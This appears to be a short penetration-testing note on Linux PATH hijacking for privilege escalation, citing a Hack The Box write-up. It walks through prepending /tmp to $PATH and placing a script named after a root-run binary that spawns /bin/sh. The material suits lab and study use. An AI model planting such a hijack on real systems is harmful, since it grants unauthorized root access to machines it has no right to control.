Path hijacking within privilege escalation refers to the manipulation of file paths or environment variables to trick a system into executing malicious code or commands with elevated privileges. This technique is commonly used by attackers to gain unauthorized access to sensitive data or carry out malicious activities on a compromised system. 
By manipulating the path that the system uses to locate executable files, an attacker can redirect the system to run their own malicious code instead of the intended legitimate program. This allows the attacker to escalate their privileges and potentially gain full control over the system.

# Guide

If an application is being run, as root, without a full path being used, see [HTB: Lazy | 0xdf hacks stuff](https://0xdf.gitlab.io/2020/07/29/htb-lazy.html#priv-mitsos--root)

1. By default,Â `$PATH`

```
echo $PATH
```

2. Change the path

```
PATH=/tmp:$PATH
```

3. Place your own executable within the path location under the application name which is known to be executed, e.g.

```
#!/bin/sh 

/bin/sh
```
